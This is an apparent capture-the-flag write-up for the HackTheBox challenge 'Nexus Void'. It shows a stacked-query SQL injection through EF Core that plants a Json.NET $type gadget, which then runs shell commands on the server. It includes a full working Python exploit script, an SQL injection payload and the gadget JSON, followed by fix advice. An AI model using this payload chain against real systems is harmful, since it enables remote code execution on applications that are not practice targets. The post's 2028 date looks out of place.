---
layout: post
title: "Nexus Void"
date: 2028-04-21 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, dotnet, deserialization, json-net, typenamehandling, sql-injection, ef-core, cwe-502, cwe-89]
description: "An ASP.NET Core auction site deserializes a database column with Json.NET's TypeNameHandling.All. A stacked-query SQL injection through Entity Framework plants a $type gadget in that column, and the app's own StatusCheckHelper class runs it as a shell command."
---

## Overview

Nexus Void is a Medium HackTheBox Web challenge — an ASP.NET Core (net7) auction site.
The source ships with the challenge, and two weaknesses chain into remote code execution:
a [Json.NET deserialization](https://cwe.mitre.org/data/definitions/502.html) sink that
trusts an attacker-named type, and a [stacked-query SQL injection](https://cwe.mitre.org/data/definitions/89.html)
through Entity Framework Core that delivers the payload into the column that gets
deserialized. The flag comes back blind — written to a file the web server happily serves.

## The technique

`SerializeHelper.Deserialize` decodes the base64 `data` column of a user's Wishlist row and
feeds it to Json.NET with the dangerous setting:

```csharp
JsonConvert.DeserializeObject(EncodeHelper.Decode(str),
    new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All });
```

`TypeNameHandling.All` makes Json.NET trust a `$type` field in the JSON that names a .NET
class + assembly, construct it, and set its properties. On .NET Core / Linux the usual
ysoserial.net WPF gadgets don't exist — but the app ships its own perfect gadget. Setting
the `command` property of `StatusCheckHelper` executes a shell command on assignment:

```csharp
public string command {
    set {
        var p = new Process { StartInfo = {
            FileName = "/bin/bash",
            Arguments = $"-c \"{value}\"",
            RedirectStandardOutput = true, UseShellExecute = false } };
        p.Start();
        output = p.StandardOutput.ReadToEnd();
    }
}
```

So a JSON object with `$type = Nexus_Void.Helpers.StatusCheckHelper, Nexus_Void` and a
`command` property runs an arbitrary command the moment it deserializes — no signing key
needed.

We never control the `data` column directly, though. It's written server-side. That's where
the SQL injection comes in: `HomeController.Setting` interpolates the `username` claim into a
raw command executed by `Database.ExecuteSqlRaw`:

```csharp
db.Database.ExecuteSqlRaw($"UPDATE Users SET username='{user.username}' WHERE ID={id}");
```

`ExecuteSqlRaw` sends raw command text, and Microsoft.Data.Sqlite executes **multiple
`;`-separated statements**. (`FromSqlRaw`, used for SELECTs, wraps its text as a subselect
and can't be stacked — the writable sinks are the `ExecuteSqlRaw` ones.) So we can append a
stacked `INSERT` that plants the gadget into a Wishlist row.

## Solution

The exploit registers a user, reads its own `ID` claim straight out of the JWT (the token is
signed, but reading the claims needs no secret), plants the gadget via the stacked-query
injection, triggers the deserialization, and reads the flag back from a static file.

The gadget copies the flag into the web root, which ASP.NET Core serves via `UseStaticFiles`.

```python
#!/usr/bin/env python3
import sys, base64, json, re, random, requests

BASE = sys.argv[1].rstrip('/')
USER = "pwn%04d" % random.randint(1000, 9999)
PASS = "pwnpass123"
s = requests.Session()

def jwt_claims(tok):
    p = tok.split('.')[1]; p += '=' * (-len(p) % 4)
    return json.loads(base64.urlsafe_b64decode(p))

# 1. register + login -> JWT cookie; read our own ID claim (no secret needed)
s.post(f"{BASE}/Login/Create", data={"username": USER, "password": PASS})
s.post(f"{BASE}/Login/Index", data={"username": USER, "password": PASS}, allow_redirects=False)
tok = s.cookies.get("Token")
uid = jwt_claims(tok)["ID"]

# 2. build the Json.NET gadget: instantiate StatusCheckHelper, its command setter runs bash
OUT = "pwn%d.txt" % random.randint(10000, 99999)
gadget = {"$type": "Nexus_Void.Helpers.StatusCheckHelper, Nexus_Void",
          "command": f"cat /flag.txt > /app/wwwroot/{OUT}"}
b64 = base64.b64encode(json.dumps(gadget).encode()).decode()

# 3. stacked-query SQLi via the username claim: plant the gadget into our Wishlist row
payload = f"x'; INSERT INTO Wishlist(ID,username,data) VALUES({uid},'z','{b64}');-- "
s.post(f"{BASE}/home/Setting", data={"username": payload, "password": "x"}, allow_redirects=False)

# 4. GET /home/Wishlist deserializes the column -> blind RCE
s.get(f"{BASE}/home/Wishlist", allow_redirects=False)

# 5. read the flag from the served static file
r = s.get(f"{BASE}/{OUT}")
print(re.search(r"HTB\{[^}]+\}", r.text).group(0))
```

Running it against the instance prints the flag:

```
HTB{...}
```

The deserialization result is cast to `List<ProductModel>`, which fails and returns `null` —
but the `command` setter has already run by then, so it's blind RCE. Writing the flag into
`wwwroot` and fetching it over HTTP is the exfiltration channel.

## Why it worked

Two trust-boundary failures compose. User input reaches raw SQL, so we control a value that
is later deserialized; and the deserializer trusts an attacker-named type. Neither alone is
game over — chained, the SQL injection delivers exactly the payload the deserializer
detonates. The app didn't even need an external gadget: it shipped a class whose property
setter shells out.

## Fix / defense

- Never set `TypeNameHandling` to anything but `None`; if polymorphism is required, use a
  strict `SerializationBinder` allowlist and deserialize into a concrete type rather than
  `object`.
- Parameterize every query — `ExecuteSqlInterpolated` / `FromSqlInterpolated` or explicit
  `DbParameter`s — so user input can never add stacked statements. Remember that
  `ExecuteSqlRaw` on SQLite runs multiple statements.
